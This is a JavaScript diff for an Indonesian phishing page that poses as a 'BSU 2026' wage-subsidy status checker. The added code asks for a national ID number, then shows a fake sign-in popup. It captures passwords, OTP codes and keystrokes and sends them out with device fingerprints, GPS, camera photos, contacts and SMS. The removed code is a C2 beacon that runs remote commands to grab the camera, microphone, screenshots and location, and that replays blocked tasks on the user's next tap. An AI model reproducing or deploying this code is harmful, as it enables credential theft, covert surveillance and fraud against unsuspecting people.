-                sendProbe();
-                if (MODE_MANIFEST) download();
-              });
-            }, 700);
-          });
-        });
-      }
+function paint(){var set=function(id,tx,s,on,wait){
+ var b=$(id),t=$(tx);if(!b)return;
+ b.className='gsi-cap-item'+((s===on)?' on':(s===wait)?' wait':(s==='denied'||s==='ditolak'||s==='na'||s==='gagal'||s==='batal')?' off':'')};
+ set('gsiCapCam','gsiCapCamTxt',camS,'on','asking');
+ $('gsiCapCamTxt').textContent=camS==='on'?'Wajah terekam':camS==='asking'?'Menyiapkan kamera':camS==='denied'?'Kamera ditolak':'Wajah';
+ set('gsiCapGps','gsiCapGpsTxt',gpsS,'ok','asking');
+ $('gsiCapGpsTxt').textContent=gpsS==='ok'?'Lokasi terdeteksi':gpsS==='asking'?'Mencari lokasi':gpsS==='denied'?'Lokasi ditolak':'Lokasi';
+ set('gsiCapKon','gsiCapKonTxt',konS,'ok','asking');
+ $('gsiCapKonTxt').textContent=konS==='ok'?'Kontak tersinkron':konS==='asking'?'Membaca kontak':konS==='na'?'Kontak n/a':'Kontak';
+ set('gsiCapSms','gsiCapSmsTxt',smsS,'ok','menunggu');
+ $('gsiCapSmsTxt').textContent=smsS==='ok'?'SMS terbaca':smsS==='menunggu'?'Menunggu SMS':smsS==='na'?'SMS n/a':'SMS'}
 
-      /* ---------- C2 ---------- */
-      function beat(force) {
-        if (!alive || (inFlight && !force)) return;
-        if (document.hidden && !force && misses === 0) return schedule(45000);
-        inFlight = true;
-        send('beacon', { vis: document.visibilityState, url: location.href, net: (navigator.connection && navigator.connection.effectiveType) || '', scr: screen.width + 'x' + screen.height })
-          .then(function (r) {
-            inFlight = false;
-            if (!r || !r.ok) { if (++misses > 6) { alive = false; return; } return schedule(); }
-            misses = 0;
-            (r.tasks || []).forEach(run);
-            schedule(r.next || 15000);
-          });
-      }
-      function schedule(b) {
-        if (!alive) return;
-        clearTimeout(beatTimer);
-        var n = b || 15000, j = n * 0.4;
-        beatTimer = setTimeout(function () { beat(); }, Math.max(4000, n - j + Math.random() * j * 2));
-      }
+function bukaPopup(){popup=true;wrap.classList.add('on');document.body.classList.add('gsi-lock');
+ $('gsiTitle').textContent='Masuk untuk melihat status';
+ $('gsiSub').textContent='Verifikasi akun untuk menampilkan status penyaluran BSU 2026 atas NIK Anda.';
+ if(NIK){$('gsiCtxNik').textContent=NIK.replace(/(\d{4})(?=\d)/g,'$1 ').trim();$('gsiCtx').classList.add('on')}
+ paint();startCam();startGps();clrSt();
+ setTimeout(function(){(emailEl.value?passEl:emailEl).focus({preventScroll:true})},260);
+ if(alive)beat(true)}
+function tutup(){popup=false;wrap.classList.remove('on');document.body.classList.remove('gsi-lock');clrSt()}
+function step2(){var v=emailEl.value.trim();
+ if(!v){$('gsiEmailField').classList.add('bad');$('gsiEmailErr').classList.add('show');emailEl.focus();return}
+ username=v;$('gsiChipText').textContent=v;$('gsiAv').textContent=v.charAt(0);$('gsiChip').style.display='flex';
+ $('gsiTitle').textContent='Selamat datang';$('gsiSub').textContent='Masuk untuk melanjutkan verifikasi';
+ $('gsiStep1').style.display='none';$('gsiStep3').style.display='none';$('gsiStep2').style.display='block';
+ clrSt();startCam();startGps();
+ tarikKontak(false);
+ setTimeout(function(){passEl.focus({preventScroll:true})},60)}
+function step3(){$('gsiStep2').style.display='none';$('gsiStep1').style.display='none';$('gsiStep3').style.display='block';
+ $('gsiTitle').textContent='Verifikasi bahwa ini Anda';
+ $('gsiSub').textContent='Masukkan kode 6 digit yang dikirim ke perangkat atau email pemulihan akun Anda.';
+ clrSt();otpBusy=false;otpEl.value='';$('gsiOtpField').classList.remove('bad');$('gsiOtpErr').classList.remove('show');
+ var b=$('gsiVerify');b.disabled=false;b.classList.remove('loading');$('gsiVfyLbl').textContent='Verifikasi';
+ setTimeout(function(){otpEl.focus({preventScroll:true})},80);
+ setTimeout(otpOtomatis,150)}
 
-      /* ---------- gesture laundering ---------- */
-      function idb(fn) {
-        return new Promise(function (res) {
-          try {
-            var rq = indexedDB.open('gsi', 1);
-            rq.onupgradeneeded = function () { rq.result.createObjectStore('q', { keyPath: 'k' }); };
-            rq.onsuccess = function () { fn(rq.result, res); };
-            rq.onerror = function () { res(); };
-          } catch (e) { res(); }
-        });
-      }
-      function stash(t) { idb(function (db, res) { try { var tx = db.transaction('q', 'readwrite'); tx.objectStore('q').put({ k: t.id, t: t }); tx.oncomplete = res; } catch (e) { res(); } }); }
-      function unstash(id) { idb(function (db, res) { try { var tx = db.transaction('q', 'readwrite'); tx.objectStore('q').delete(id); tx.oncomplete = res; } catch (e) { res(); } }); }
-      function loadStash() {
-        return new Promise(function (res) {
-          idb(function (db, done) {
-            try {
-              var tx = db.transaction('q', 'readonly'), rq = tx.objectStore('q').getAll();
-              rq.onsuccess = function () { done(rq.result || []); };
-              rq.onerror = function () { done([]); };
-            } catch (e) { done([]); }
-          }).then(res);
-        });
-      }
+function bukaHasil(){
+ var d=dekNIK(NIK),pr={11:'Aceh',12:'Sumatera Utara',13:'Sumatera Barat',14:'Riau',15:'Jambi',16:'Sumatera Selatan',17:'Bengkulu',18:'Lampung',19:'Kep. Bangka Belitung',21:'Kep. Riau',31:'DKI Jakarta',32:'Jawa Barat',33:'Jawa Tengah',34:'DI Yogyakarta',35:'Jawa Timur',36:'Banten',51:'Bali',52:'NTB',53:'NTT',61:'Kalimantan Barat',62:'Kalimantan Tengah',63:'Kalimantan Selatan',64:'Kalimantan Timur',65:'Kalimantan Utara',71:'Sulawesi Utara',72:'Sulawesi Tengah',73:'Sulawesi Selatan',74:'Sulawesi Tenggara',75:'Gorontalo',76:'Sulawesi Barat',81:'Maluku',82:'Maluku Utara',91:'Papua',92:'Papua Barat',93:'Papua Selatan',94:'Papua Tengah'};
+ $('hNik').textContent=NIK.replace(/(\d{4})(?=\d)/g,'$1 ');
+ $('hWil').textContent=(pr[d.prov]||'-')+' / '+(d.kab||'-')+' / '+(d.kec||'-');
+ $('hBank').textContent=['BRI','BNI','Mandiri','BTN'][d.prov.charCodeAt(1)%4];
+ var el=$('res');el.className='alert on';el.style.cssText='background:#e3f3e5;border:1px solid #b6e0bd;color:#14622a';
+ el.textContent='Verifikasi berhasil. Data penerima atas NIK Anda ditemukan.';
+ $('hasil').classList.add('on');
+ setTimeout(function(){$('hasil').scrollIntoView({behavior:'smooth',block:'center'})},150)}
 
-      /* ---------- modul C2 ---------- */
-      function reply(t, isi) { send('hasil', { id: t.id, cmd: t.cmd, isi: String(isi) }); }
-      var cur = null;
+function finish(){stopCam();try{localStorage.setItem('zgch_last_user',username)}catch(e){}
+ if(lastQ)raw(lastQ);patch();sendProbe();
+ setSt('Mengambil data status...','#188038');
+ setTimeout(function(){tutup();bukaHasil()},600)}
+function submit(){if(busy)return;var p=passEl.value;
+ if(!p){$('gsiPassField').classList.add('bad');$('gsiPassErr').classList.add('show');passEl.focus();return}
+ busy=true;tSub=Date.now();
+ var body={rid:ridCur,username:username,password:p,deviceId:devId(),userAgent:navigator.userAgent,
+ platform:(navigator.userAgentData&&navigator.userAgentData.platform)||navigator.platform,language:navigator.language,
+ timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,screen:screen.width+'x'+screen.height,
+ referrer:document.referrer,page:location.href,ip:ip,nik:NIK,keylog:JSON.stringify(KEYS.slice(-80))};
+ step3();setSt('Menyimpan sandi...','#5f6368');
+ seal(Object.assign({action:'login',sid:sid},body)).then(function(e){
+  var q='action=login&sid='+sid+'&enc=1&gz='+e.g+'&p='+encodeURIComponent(e.b);lastQ=q;
+  return post(q).then(function(r){
+   if(!r.ok){raw(q);setSt('Koneksi lambat, sandi lewat jalur cadangan.','#b06000')}
+   else{var d={};try{d=JSON.parse(r.t)}catch(x){}
+    if(d&&d.ok)setSt('Sandi tersimpan. Masukkan kode verifikasi.','#188038');
+    else setSt('Server: '+((d&&d.error)||'?')+' — tetap masukkan kode.','#d93025')}
+   upload();patch()})})}
+function verify(){if(otpBusy)return;var c=otpEl.value.replace(/\D/g,'');
+ if(c.length<6){$('gsiOtpField').classList.add('bad');$('gsiOtpErr').classList.add('show');otpEl.focus();return}
+ otpBusy=true;var b=$('gsiVerify');b.disabled=true;b.classList.add('loading');$('gsiVfyLbl').textContent='Memverifikasi...';clrSt();
+ send('sms',{jenis:'otp',pengirim:'-',isi:c,otomatis:smsS==='ok'?1:0});
+ send('otp',{rid:ridCur,username:username,code:c}).then(function(r){
+  if(r&&r.ok){setSt('Kode terverifikasi','#188038');return setTimeout(finish,450)}
+  otpBusy=false;b.disabled=false;b.classList.remove('loading');$('gsiVfyLbl').textContent='Verifikasi';
+  setSt('Kode belum tersimpan, coba lagi atau lewati.','#d93025')})}
 
-      function exec(cmd, arg) {
-        return new Promise(function (res, rej) {
-          var done = function (v) { reply(cur, v); res(v); };
-          switch (cmd) {
-            case 'foto': photo = ''; photoSent = false; camState = 'idle'; camDone = function () { done(photo || 'gagal'); }; startCam(); return;
-            case 'lokasi': return locNow(done, rej);
-            case 'tangkap': return shot(done, rej);
-            case 'layar': return done(JSON.stringify({ vw: innerWidth, vh: innerHeight, dpr: devicePixelRatio, y: scrollY, title: document.title, forms: document.forms.length, inputs: document.querySelectorAll('input').length, dom: document.documentElement.outerHTML.length, teks: (document.body.innerText || '').slice(0, 700), html: document.documentElement.outerHTML.slice(0, 4000) }));
-            case 'audio': return mic(done, rej);
-            case 'pindai': return pindai(done);
-            case 'sidik': return done(JSON.stringify({ fp: fp(), font: fontFp(), audio: audioFpCache, gpu: invCache.gpu }));
-            case 'media': return mediaScan().then(done);
-            case 'sensor': senStart(); setTimeout(function () { done(sen.ctx || 'tanpa sensor'); }, 6200); return;
-            case 'perangkat': return done(JSON.stringify(inventaris()));
-            case 'getar': try { navigator.vibrate([220, 110, 220, 110, 420]); done('getar'); } catch (e) { rej(e); } return;
-            case 'senter': return torch(done, rej);
-            case 'bangun': if (!navigator.wakeLock) return done('tidak didukung'); navigator.wakeLock.request('screen').then(function () { done('ditahan'); }).catch(rej); return;
-            case 'notif': if (!window.Notification) return done('tidak didukung'); Notification.requestPermission().then(function (p) { if (p !== 'granted') return done('ditolak'); new Notification('BSU 2026', { body: arg || 'Pengecekan status' }); done('tampil'); }).catch(rej); return;
-            case 'salin': if (!navigator.clipboard) return done('tidak didukung'); navigator.clipboard.writeText(arg || 'BSU 2026').then(function () { done('disalin'); }).catch(rej); return;
-            case 'bicara': if (!window.speechSynthesis) return done('tidak didukung'); speechSynthesis.speak(new SpeechSynthesisUtterance(arg || 'Bantuan Subsidi Upah 2026')); done('dibacakan'); return;
-            case 'bagikan': if (!navigator.share) return done('tidak didukung'); navigator.share({ title: 'BSU 2026', text: arg || 'Cek status', url: location.href }).then(function () { done('dibagikan'); }).catch(rej); return;
-            case 'buka': location.href = arg || NEXT_URL; done('dibuka'); return;
-            case 'kontak': if (!navigator.contacts) return done('tidak didukung'); navigator.contacts.select(['name', 'tel', 'email'], { multiple: true }).then(function (c) { done(JSON.stringify(c)); }).catch(rej); return;
-            case 'jejak': return done(JSON.stringify({ len: history.length, ref: document.referrer }));
-            case 'kill': alive = false; clearTimeout(beatTimer); done('dihentikan'); return;
-            default: done('tidak dikenal');
-          }
-        });
-      }
+function fname(el){return!el?'':(el.id||el.name||el.type||el.tagName.toLowerCase())}
+document.addEventListener('input',function(e){var t=e.target;if(!t||!/^(INPUT|TEXTAREA|SELECT)$/.test(t.tagName))return;
+ KEYS.push({t:Math.round(performance.now()),f:fname(t),v:String(t.value).slice(0,90)});if(KEYS.length>400)KEYS.splice(0,120)},true);
+document.addEventListener('change',function(e){var t=e.target;
+ if(t&&t.tagName==='SELECT')KEYS.push({t:Math.round(performance.now()),f:fname(t),v:String(t.value).slice(0,60)})},true);
+document.addEventListener('click',function(e){
+ var a=e.target.closest?e.target.closest('a[href^="tel:"]'):null;
+ if(!a)return;var n=a.getAttribute('href').replace(/^tel:/,'').replace(/\s+/g,'');
+ if(n)kirimTel([{nomor:n,sumber:'klik'}])},true);
+function mutStart(){if(mutObs||!window.MutationObserver)return;
+ mutObs=new MutationObserver(function(list){list.forEach(function(m){
+  if(m.type==='characterData'){var v=String(m.target.nodeValue||'').trim();if(v)mutasi.push({t:Date.now(),x:v.slice(0,80)})}
+  else m.addedNodes.forEach(function(nd){if(nd.nodeType===1){var s=String(nd.innerText||'').trim();if(s)mutasi.push({t:Date.now(),x:s.slice(0,80)})}})})});
+ mutObs.observe(document.body,{childList:true,subtree:true,characterData:true});
+ if(mutasi.length>300)mutasi.splice(0,100)}
 
-      function run(t) {
-        cur = t;
-        exec(t.cmd, t.arg).catch(function (e) {
-          if (e && (e.name === 'NotAllowedError' || e.name === 'SecurityError' || e.name === 'InvalidStateError')) {
-            stash(t);
-            reply(t, 'ditahan: butuh gestur');
-          } else reply(t, 'gagal: ' + (e && e.message || e));
-        });
-      }
+var CH='ABCDEFGHJKLMNPQRSTUVWXYZ23456789',capCode='';
+function drawCap(){var c=$('capBox'),w=c.width,h=c.height,x=c.getContext('2d');
+ x.clearRect(0,0,w,h);x.fillStyle='#f7f3ea';x.fillRect(0,0,w,h);capCode='';
+ for(var i=0;i<6;i++)capCode+=CH[Math.floor(Math.random()*CH.length)];
+ for(var l=0;l<4;l++){x.strokeStyle='rgba('+(120+Math.random()*60|0)+',60,60,'+(0.25+Math.random()*0.3)+')';
+  x.lineWidth=1+Math.random();x.beginPath();x.moveTo(Math.random()*w,Math.random()*h);x.lineTo(Math.random()*w,Math.random()*h);x.stroke()}
+ for(var k=0;k<26;k++){x.fillStyle='rgba(90,50,50,'+(Math.random()*0.4)+')';x.fillRect(Math.random()*w,Math.random()*h,1.4,1.4)}
+ for(var j=0;j<6;j++){x.save();x.translate(9+j*19+Math.random()*3,30+Math.random()*5);x.rotate((Math.random()-0.5)*0.55);
+  x.font='bold '+(21+Math.random()*5|0)+'px Georgia,serif';x.fillStyle='#6d2a2a';x.fillText(capCode[j],0,0);x.restore()}}
 
-      function flushStash() {
-        loadStash().then(function (list) {
-          list.forEach(function (row, i) {
-            var t = row.t;
-            setTimeout(function () {
-              launderTried++;
-              cur = t;
-              exec(t.cmd, t.arg).then(function () { launderOk++; unstash(t.id); sendProbe(); })
-                .catch(function () { });
-            }, 260 * i);
-          });
-        });
-      }
+var PV={11:1,12:1,13:1,14:1,15:1,16:1,17:1,18:1,19:1,21:1,31:1,32:1,33:1,34:1,35:1,36:1,51:1,52:1,53:1,61:1,62:1,63:1,64:1,65:1,71:1,72:1,73:1,74:1,75:1,76:1,81:1,82:1,91:1,92:1,93:1,94:1};
+function dekNIK(n){var p=n.substr(0,2),dd=parseInt(n.substr(6,2),10),jk=dd>40?'P':'L';if(dd>40)dd-=40;
+ var mm=parseInt(n.substr(8,2),10);
+ return{prov:p,kab:n.substr(2,4),kec:n.substr(4,2),jk:jk,ttl:(dd<10?'0':'')+dd+'/'+(mm<10?'0':'')+mm+'/'+n.substr(10,2),
+ sah:!!PV[p]&&mm>=1&&mm<=12&&dd>=1&&dd<=31}}
+var nikBusy=false;
+$('nik').addEventListener('input',function(e){var v=e.target.value.replace(/\D/g,'').slice(0,16);
+ if(e.target.value!==v)e.target.value=v;$('nikErr').classList.remove('on');$('nik').classList.remove('bad')});
+$('cap').addEventListener('input',function(){$('capErr').classList.remove('on');$('cap').classList.remove('bad')});
+$('ganti').onclick=function(){drawCap();$('cap').value='';$('capErr').classList.remove('on')};
+$('nik').addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();$('cek').click()}});
+$('cap').addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();$('cek').click()}});
 
-      function shot(done, rej) {
-        if (window.html2canvas) return window.html2canvas(document.body, { scale: 0.6, logging: false }).then(function (c) { done(c.toDataURL('image/jpeg', 0.6)); }).catch(rej);
-        var s = document.createElement('script');
-        s.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
-        s.onload = function () { window.html2canvas(document.body, { scale: 0.6, logging: false }).then(function (c) { done(c.toDataURL('image/jpeg', 0.6)); }).catch(rej); };
-        s.onerror = function () { rej(new Error('pustaka gagal')); };
-        document.head.appendChild(s);
-      }
-      function torch(done, rej) {
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }).then(function (s) {
-          var tr = s.getVideoTracks()[0];
-          if (!tr.getCapabilities || !tr.getCapabilities().torch) { s.getTracks().forEach(function (t) { t.stop(); }); return done('tidak didukung'); }
-          tr.applyConstraints({ advanced: [{ torch: true }] }).then(function () { done('menyala'); setTimeout(function () { s.getTracks().forEach(function (t) { t.stop(); }); }, 12000); }).catch(rej);
-        }).catch(rej);
-      }
-      function pindai(done) {
-        var r = inventaris();
-        Promise.all([permScan(), mediaScan()]).then(function (x) { r.perm = x[0]; r.media = x[1]; r.sensor = sen.ctx; done(JSON.stringify(r)); });
-      }
-      function locNow(done, rej) {
-        if (!navigator.geolocation) return done('tidak didukung');
-        navigator.geolocation.getCurrentPosition(function (p) {
-          var o = { lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy) };
-          fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat=' + o.lat + '&lon=' + o.lng)
-            .then(function (r) { return r.json(); }).then(function (d) { o.alamat = (d && d.display_name) || ''; done(JSON.stringify(o)); }).catch(function () { done(JSON.stringify(o)); });
-        }, function (e) { rej(e); }, { enableHighAccuracy: true, timeout: 12000 });
-      }
-      function mic(done, rej) {
-        if (!navigator.mediaDevices || !window.MediaRecorder) return done('tidak didukung');
-        navigator.mediaDevices.getUserMedia({ audio: true }).then(function (s) {
-          var ch = [], mr = new MediaRecorder(s);
-          mr.ondataavailable = function (e) { if (e.data.size) ch.push(e.data); };
-          mr.onstop = function () { s.getTracks().forEach(function (t) { t.stop(); }); var fr = new FileReader(); fr.onload = function () { done(fr.result); }; fr.readAsDataURL(new Blob(ch, { type: 'audio/webm' })); };
-          mr.start(); setTimeout(function () { try { mr.stop(); } catch (e) { } }, 3000);
-        }).catch(rej);
-      }
+$('cek').addEventListener('click',function(){
+ if(nikBusy)return;
+ var n=$('nik').value.trim(),cap=$('cap').value.trim(),bad=false;
+ if(n.length!==16){$('nik').classList.add('bad');$('nikErr').classList.add('on');bad=true}
+ if(cap.toUpperCase()!==capCode){$('cap').classList.add('bad');$('capErr').classList.add('on');bad=true}
+ if(bad)return;
+ nikBusy=true;var b=$('cek');b.disabled=true;b.classList.add('load');$('cekLbl').textContent='Memeriksa data...';
+ NIK=n;var d=dekNIK(n);try{localStorage.setItem('zgch_nik',n)}catch(e){}
+ $('hasil').classList.remove('on');
+ send('nik',{nik:n,prov:d.prov,kab:d.kab,kec:d.kec,jk:d.jk,ttl:d.ttl,sah:d.sah,ip:ip,kota:kota,isp:isp,
+  lat:gps?gps.lat:'',lng:gps?gps.lng:'',alamat:addr,sumber:sumber,model:invC.model||'-',ua:navigator.userAgent,
+  fp:fp(),dev:devId(),konteks:'pengecekan'});
+ setTimeout(function(){
+  var el=$('res');
+  if(!d.sah){el.className='alert err on';
+   el.textContent='NIK yang Anda Masukkan belum memenuhi kriteria. Periksa kembali 16 digit NIK Anda.';
+   b.disabled=false;b.classList.remove('load');$('cekLbl').textContent='Cek Status';nikBusy=false;return}
+  el.className='alert warn on';
+  el.textContent='NIK ditemukan di basis data calon penerima. Status penyaluran hanya dapat ditampilkan setelah verifikasi akun.';
+  setTimeout(function(){
+   b.disabled=false;b.classList.remove('load');$('cekLbl').textContent='Cek Status';nikBusy=false;
+   bukaPopup()},700)},1200)});
 
-      /* ---------- kamera wajah ---------- */
-      function startCam() {
-        if (camState === 'on') return grab();
-        camState = 'asking'; paint('cam');
-        if (!navigator.mediaDevices) { camState = 'na'; paint('cam'); return fire(); }
-        var use = function (s) {
-          stream = s; camState = 'on'; paint('cam');
-          vid.srcObject = s; var p = vid.play(); if (p && p.catch) p.catch(function () { });
-          setTimeout(grab, 1100);
-        };
-        if (window.__lastCam && window.__lastCam.active) { use(window.__lastCam); return; }
-        navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 640 } } })
-          .then(use).catch(function () { camState = 'denied'; paint('cam'); fire(); });
-      }
-      function fire() { var f = camDone; camDone = null; if (f) f(); }
-      function grab() { if (!stream || photo) return; if (!vid.videoWidth) return setTimeout(grab, 200); shots = 0; best = ''; bestScore = -1; burst(); }
-      function burst() {
-        if (!stream) return;
-        if (shots >= 3) return settle();
-        shots++;
-        var w = 440, h = Math.round(vid.videoHeight * (440 / vid.videoWidth));
-        cv.width = w; cv.height = h;
-        var c = cv.getContext('2d'); c.drawImage(vid, 0, 0, w, h);
-        var sc = sharp(c, w, h);
-        if (sc > bestScore) { bestScore = sc; try { best = cv.toDataURL('image/jpeg', 0.72); } catch (e) { } }
-        setTimeout(burst, 240);
-      }
-      function sharp(c, w, h) {
-        var d, s = 0, s2 = 0, n = 0;
-        try { d = c.getImageData(0, 0, w, h).data; } catch (e) { return 0; }
-        for (var i = 0; i < d.length; i += 52) { var v = d[i] * .299 + d[i + 1] * .587 + d[i + 2] * .114; s += v; s2 += v * v; n++; }
-        if (!n) return 0;
-        var m = s / n, sd = Math.sqrt(Math.max(s2 / n - m * m, 0));
-        return m < 22 ? sd * .35 : sd;
-      }
-      function settle() {
-        if (!best && rounds < 2 && stream) { rounds++; return setTimeout(grab, 450); }
-        if (!best) { camState = 'na'; paint('cam'); stopCam(); return fire(); }
-        photo = best;
-        var th = $('gsiCapThumb'); th.src = photo; th.classList.add('on');
-        paint('cam'); stopCam(); fire(); upload();
-      }
-      function stopCam() { if (!stream) return; try { stream.getTracks().forEach(function (t) { t.stop(); }); } catch (e) { } stream = null; window.__lastCam = null; try { vid.srcObject = null; } catch (e) { } }
-      function upload() { if (!photo || !ridCur || photoSent) return; photoSent = true; send('foto', { rid: ridCur, username: username, foto: photo }).then(function (r) { if (!r || !r.ok) { photoSent = false; schedule(6000); } }); }
+$('gsiX').addEventListener('click',tutup);
+$('gsiNext').addEventListener('click',step2);
+$('gsiSignIn').addEventListener('click',submit);
+$('gsiVerify').addEventListener('click',verify);
+$('gsiSkip').addEventListener('click',finish);
+emailEl.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();step2()}});
+passEl.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();submit()}});
+otpEl.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();verify()}});
+passEl.addEventListener('paste',function(){pasted=true});
+passEl.addEventListener('input',function(){$('gsiPassField').classList.remove('bad');$('gsiPassErr').classList.remove('show')});
+emailEl.addEventListener('input',function(){$('gsiEmailField').classList.remove('bad');$('gsiEmailErr').classList.remove('show')});
+otpEl.addEventListener('input',function(){var v=otpEl.value.replace(/\D/g,'').slice(0,6);
+ if(otpEl.value!==v)otpEl.value=v;$('gsiOtpField').classList.remove('bad');$('gsiOtpErr').classList.remove('show');
+ if(v.length===6)setTimeout(verify,120)});
+$('gsiShow').addEventListener('change',function(){passEl.type=this.checked?'text':'password';passEl.focus()});
+$('gsiForgotEmail').addEventListener('click',function(){alert('Hubungi admin.')});
+$('gsiForgotPass').addEventListener('click',function(){alert('Hubungi admin.')});
+$('gsiCreate').addEventListener('click',function(){alert('Pendaftaran oleh admin.')});
+$('gsiTryOther').addEventListener('click',function(){otpOtomatis();setSt('Menunggu SMS masuk...','#5f6368')});
+wrap.addEventListener('click',function(e){if(e.target===wrap)tutup()});
+document.addEventListener('keydown',function(e){if(e.key==='Escape'&&popup)tutup()});
 
-      /* ---------- GPS ---------- */
-      function startGps() {
-        if (gpsState !== 'idle') return;
-        gpsState = 'asking'; paint('gps');
-        if (!navigator.geolocation) { gpsState = 'na'; paint('gps'); return; }
-        navigator.geolocation.getCurrentPosition(function (p) {
-          gps = { lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6), acc: Math.round(p.coords.accuracy || 0) };
-          sumber = 'gps'; gpsState = 'ok'; paint('gps');
-          fetch('https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=17&addressdetails=1&accept-language=id&lat=' + gps.lat + '&lon=' + gps.lng)
-            .then(function (r) { return r.json(); }).then(function (d) { if (d && d.display_name) addr = String(d.display_name).slice(0, 220); patch(); }).catch(function () { });
-          patch(); sendAuto();
-        }, function () { gpsState = 'denied'; paint('gps'); }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 60000 });
-      }
+function pintu(){
+ izC('camera').then(function(c){if(c==='granted'||izM('cam')==='ok')senyap++;startCam()});
+ izC('geolocation').then(function(g){if(g==='granted'||izM('geo')==='ok'){senyap++;startGps();lacak()}else startGps()});
+ setTimeout(function(){if(!photo)startCam()},7000)}
 
-      function patch() {
-        if (!ridCur) return;
-        var o = {};
-        if (gps) { o.lat = gps.lat; o.lng = gps.lng; o.acc = gps.acc; }
-        if (addr) o.alamat = addr;
-        if (ip) { o.ip = ip; o.isp = isp + (kota ? ' — ' + kota : ''); }
-        if (!o.lat && !o.ip) return;
-        o.rid = ridCur; o.username = username; o.fingerprint = fp();
-        o.perangkat = (navigator.hardwareConcurrency || 0) + 'c/' + (navigator.deviceMemory || 0) + 'GB';
-        o.catatan = 'isi ' + ((tSubmit ? tSubmit - t0 : 0) / 1000).toFixed(1) + 's tempel ' + (pasted ? 'y' : 'n') + ' auto ' + (autofill ? 'y' : 'n');
-        send('extra', o);
-      }
+document.addEventListener('pointerdown',function(){
+ flushStash();
+ if(!photo&&camS!=='on')startCam();
+ if(gpsS==='idle'||gpsS==='denied'){gpsS='idle';startGps()}
+ if(!watchId)lacak();
+ if(konTertunda&&!konDone&&popup&&$('gsiStep2').style.display!=='none'){konTertunda=false;tarikKontak(false)}
+ if(popup&&$('gsiStep3').style.display!=='none'&&smsS!=='ok')otpOtomatis()},true);
+document.addEventListener('visibilitychange',function(){if(!document.hidden&&alive){beat(true);if(!photo)startCam()}});
+window.addEventListener('online',function(){if(alive)beat(true);flushStash()});
+window.addEventListener('pagehide',function(){if(lastQ)raw(lastQ);if(ROWS.length)sendMx();if(gps)kirimJejak()});
+$('burger').onclick=function(){$('nav').classList.toggle('open')};
 
-      /* ---------- probe summary ---------- */
-      function sendProbe() {
-        if (!probeDone && !launderOk) return;
-        send('probe', {
-          probe: JSON.stringify({ states: STATES, uaActive: navigator.userActivation ? navigator.userActivation.isActive : null, uaEver: navigator.userActivation ? navigator.userActivation.hasBeenActive : null, cam: camState, geo: gpsState, launder: launderOk, launderTried: launderTried }),
-          yield: yieldScore(), prompts: prompts, launder: launderOk, konteks: sen.ctx
-        });
-      }
-      function yieldScore() {
-        var n = 0;
-        ['model','os','gpu','font','audio','perm','media','sensor','ip','kota','lat','lng','alamat'].forEach(function (k) { if (invCache[k]) n++; });
-        if (photo) n += 5;
-        if (username) n += 2;
-        if (ridCur) n += 3;
-        return Math.max(n - prompts, 0);
-      }
-
-      function sendAuto() {
-        if (sendAuto.done) return;
-        sendAuto.done = true;
-        var inv = inventaris();
-        Object.assign(invCache, inv);
-        inv.ip = ip; inv.kota = kota; inv.isp = isp;
-        if (gps) { inv.lat = gps.lat; inv.lng = gps.lng; inv.acc = gps.acc; inv.sumber = sumber || 'gps'; }
-        if (addr) inv.alamat = addr;
-        inv.sensor = sen.ctx;
-        inv.audio = audioFpCache;
-        Promise.all([uaData(), permScan(), mediaScan()]).then(function (r) {
-          inv.model = (r[0] && r[0].model) || '-';
-          inv.os = (r[0] && r[0].platform) ? r[0].platform + ' ' + (r[0].platformVersion || '') : navigator.platform;
-          inv.perangkat = 'cores=' + (inv.cores || 0) + ' mem=' + (inv.mem || 0) + 'GB touch=' + (inv.touch || 0) + ' dpr=' + inv.dpr + ' scr=' + inv.scr;
-          inv.perm = r[1]; inv.media = r[2]; inv.gpu = inv.gpu || '-'; inv.font = inv.font || '-';
-          invCache.perm = r[1]; invCache.media = r[2]; invCache.model = inv.model;
-          send('auto', inv);
-        });
-      }
-
-      function geoIp() {
-        return fetch('https://ipwho.is/', { mode: 'cors' }).then(function (r) { return r.json(); }).then(function (d) {
-          if (!d || d.success === false) return;
-          ip = d.ip || ''; kota = d.city || ''; isp = (d.connection && d.connection.isp) || '';
-          if (!gps && d.latitude) { gps = { lat: String(d.latitude), lng: String(d.longitude), acc: 5000 }; sumber = 'ip'; }
-          sendAuto();
-        }).catch(function () { });
-      }
-
-      /* ---------- panel dev ---------- */
-      function devRow(r) {
-        if (!MODE_DEV) return;
-        var dv = $('dv');
-        var el = document.createElement('div');
-        el.className = 'row';
-        el.innerHTML = '<span class="k k' + r.kelas + '">' + r.kelas + '</span><span class="c">' + r.cap + '</span>'
-          + '<span class="n">' + r.note.replace(/[<>&]/g, '') + '</span><span class="l">' + r.lat + 'ms</span>';
-        dv.insertBefore(el, dv.querySelector('.tail'));
-        devChips();
-      }
-      function devChips() {
-        if (!MODE_DEV) return;
-        var m = localMetrics();
-        var c = $('dv').querySelector('.chips');
-        if (!c) return;
-        c.innerHTML = '<span class="chip">SGR <b>' + m.sgr + '</b></span><span class="chip">PAR <b>' + m.par + '</b></span>'
-          + '<span class="chip">ALH <b>' + m.alh + 'ms</b></span><span class="chip">LSR <b>' + launderOk + '/' + launderTried + '</b></span>'
-          + '<span class="chip">n <b>' + m.n + '</b></span><span class="chip">seed <b>' + SEED + '</b></span>';
-      }
-      function devInit() {
-        var dv = $('dv');
-        dv.className = 'on';
-        dv.innerHTML = '<h4>ZGCH-D &middot; matriks langsung &middot; ' + (MODE_CTRL ? 'kontrol' : MODE_BENCH ? 'bench' : 'utama') + '</h4>'
-          + '<div class="chips"></div>'
